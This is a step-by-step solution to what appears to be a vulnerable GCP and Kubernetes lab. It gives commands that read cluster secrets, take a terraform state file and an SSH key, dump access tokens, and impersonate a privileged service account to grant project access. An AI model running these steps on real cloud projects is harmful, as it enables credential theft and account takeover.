# Challenge 1

1. cluster already has endpoints exposed to internet:  
`curl -k https:<IP>/version` for example works without an access token (accessible by system:anonymous)
2. some endpoints are in the system:authenticated group:  
`curl -k https:<IP>/api` returns a 403, but any access token is enough to access the endpoint:  
`curl -k -H "Authorization:Bearer <token> https://<IP>/api"`
3. check what you can access:  
`curl -X POST -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1", "kind":"SelfSubjectRulesReview", "spec":{"namespace":"*"}}' -k -H "Authorization:Bearer <token>" https://<cluster IP>/apis/authorization.k8s.io/v1/selfsubjectrulesreviews`
4. access secrets  
`curl -k -H "Authorization:Bearer <token>" https://<IP>/api/v1/secrets`  
5. access configmaps to gain more info on the deployment - for example which storage bucket it uses.

To get an access token for your google login, you can use the [oauth playground](https://developers.google.com/oauthplayground/).  
Choose the Kubernetes Engine API v1 endpoint and exchange your authorization code for an access token.

# Challenge 2

1. The exposed kubernetes secret contains a service account key. The service account key also contains the ID of the vulnerable gcp project
2. Access the storage bucket using the service account key:  
`gcloud auth activate-service-account --key-file <path-to-file>`  
`gsutil ls gs://<bucket>`  
`gsutil cp gs://<bucket>/terraform.tfstate ./`

# Challenge 3

1. Get the compute IP address, username and SSH key from the terraform state file
2. SSH into the VM: `ssh -i <key> alice@<ip>`
3. Check the service account and access scopes that the VM is using:  
`gcloud auth list`  
`gcloud auth print-access-token`  
`curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$TOKEN`
4. Find that you are able to access all storage buckets with this account. On one storage bucket you can find the source code of a cloud function.

# Challenge 4

1. Find that the VM calls a cloud function (from hint on the VM)
2. You will be able to call the function using the VMs identity token: `gcloud auth print-identity-token`
3. The function will leak its own access token
4. Use the tokeninfo endpoint again to find what this token can do: `curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$TOKEN`
5. It uses the compute default service account with the full cloud-platform access scope. This account also has the `roles/compute.serviceAgent` role of the compute engine service agent, allowing service account impersonation on all service accounts in the project. To find out the permissions you have on project level run: `gcloud projects get-iam-policy <project-id>`

# Challenge 5

1. When listing the IAM policies on the project, another powerful service account is revealed. The `terraform-pipeline` service account has a highly privileged custom role that allows setting new IAM bindings on project level.
2. Impersonate that service account and add yourself as viewer to the GCP project:  
`gcloud projects add-iam-policy-binding <project-id> --member=user:<your user> --role=roles/viewer --condition=None --impersonate-service-account <terraform pipeline account>`
